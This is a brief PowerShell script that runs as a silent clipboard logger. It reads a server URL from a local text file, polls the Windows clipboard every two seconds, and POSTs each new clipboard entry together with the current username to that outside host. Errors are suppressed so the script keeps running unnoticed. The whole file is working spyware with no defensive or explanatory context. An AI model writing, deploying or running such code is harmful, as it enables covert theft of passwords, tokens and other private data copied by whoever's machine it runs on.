Add-Type -AssemblyName System.Windows.Forms

# GET THE PASS
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
$webhookFile = Join-Path $scriptDir "yourhttp_server.txt"

# CHECK
if (-Not (Test-Path $webhookFile)) { exit }

# READ THE URL
$webhook = Get-Content $webhookFile -Raw
$webhook = $webhook.Trim()

if (-Not ($webhook -match "^https?://")) { exit }

# GET THE USERNAME AND CLIP
$username = $env:USERNAME
$lastClipboard = ""

while ($true) {
    try {
        $clip = [Windows.Forms.Clipboard]::GetText()
        if ($clip -and $clip -ne $lastClipboard) {
            $lastClipboard = $clip
            $body = @{
                username = $username
                clipboard = $clip
            } | ConvertTo-Json -Compress
            Invoke-RestMethod -Uri $webhook -Method POST -Body $body -ContentType "application/json"
        }
    } catch {}
    Start-Sleep -Seconds 2
}
